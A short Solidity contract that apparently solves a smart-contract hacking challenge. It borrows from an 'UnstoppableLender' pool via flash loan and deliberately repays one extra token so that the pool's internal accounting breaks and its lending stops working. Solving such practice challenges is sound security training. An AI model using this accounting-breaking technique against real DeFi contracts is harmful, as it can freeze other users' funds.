// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract UnstoppableAttacker {

    UnstoppableLender private immutable pool;

    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
    }

    // Pool will call this function during the flash loan
    function receiveTokens(address tokenAddress, uint256 amount) external {
        // It would be shame if we would send back 1 plus token thus braking the internal accounting...
        require(IERC20(tokenAddress).transfer(msg.sender, amount + 1), "Transfer of tokens failed");
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    receive() external payable {}
}
